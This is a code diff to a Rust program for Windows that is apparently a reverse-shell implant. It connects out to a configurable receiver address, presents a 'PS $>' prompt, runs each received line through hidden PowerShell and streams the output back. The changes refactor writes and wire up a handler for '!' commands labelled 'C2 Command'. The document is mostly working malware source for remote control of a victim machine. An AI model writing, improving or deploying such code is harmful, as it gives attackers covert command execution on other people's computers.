@@ -3,7 +3,7 @@ use windows::Win32::UI::WindowsAndMessaging::{MessageBoxA, MESSAGEBOX_STYLE};
 use windows::core::PCSTR;
 use windows::Win32::Foundation::HWND;
 mod cmd;
-use cmd::parse_command;
+use cmd::{parse_command, handle};
 
 /// 
 /// The receiver address. Change this!
@@ -39,7 +39,7 @@ fn main() {
     let mut rx = BufReader::new(connection);
 
     // Kickoff the conversation with the prompt
-    tx.write("\nPS $> ".as_bytes()).unwrap();
+    tx.write_all("\nPS $> ".as_bytes()).unwrap();
     tx.flush().unwrap();
 
     // Initialize an empty String to hold our received data
@@ -50,7 +50,7 @@ fn main() {
         read_buf.clear();
 
         // Send our prompt
-        tx.write("\nPS $> ".as_bytes()).unwrap();
+        tx.write_all("\nPS $> ".as_bytes()).unwrap();
         // This ensure the  BufWriter data has been sent
         tx.flush().unwrap();
 
@@ -64,13 +64,21 @@ fn main() {
                     let cmd = read_buf.trim();
 
                     // Let's check to see if we have a real Command
-                    if cmd.starts_with("!") {
+                    if cmd.starts_with('!') {
                         match parse_command(cmd) {
                             Some(c) => {
-                                tx.write(format!("C2 Command: {:?}", c).as_bytes()).unwrap();
+                                // Send the command output
+                                match handle(c) {
+                                    Ok(res) => {
+                                        tx.write_all(format!("[+] {res}").as_bytes()).unwrap();
+                                    },
+                                    Err(e) => {
+                                        tx.write_all(format!("[!] {e}").as_bytes()).unwrap();
+                                    }
+                                }
                             },
                             None => {
-                                tx.write(format!("Bad Command: {cmd}").as_bytes()).unwrap();
+                                tx.write_all(format!("Bad Command: {cmd}").as_bytes()).unwrap();
                             }
                         }
                     } else {
@@ -81,13 +89,13 @@ fn main() {
                         .arg("-w")
                         .arg("hidden")
                         .arg("-c")
-                        .arg(format!("{cmd}"))
+                        .arg(cmd)
                         .output()
                         .expect("Command failed!");  
     
                         // Join stdout and stderr in the output
-                        tx.write(&output.stdout).unwrap();
-                        tx.write(&output.stderr).unwrap();
+                        tx.write_all(&output.stdout).unwrap();
+                        tx.write_all(&output.stderr).unwrap();
                         
                     }
                     tx.flush().unwrap();
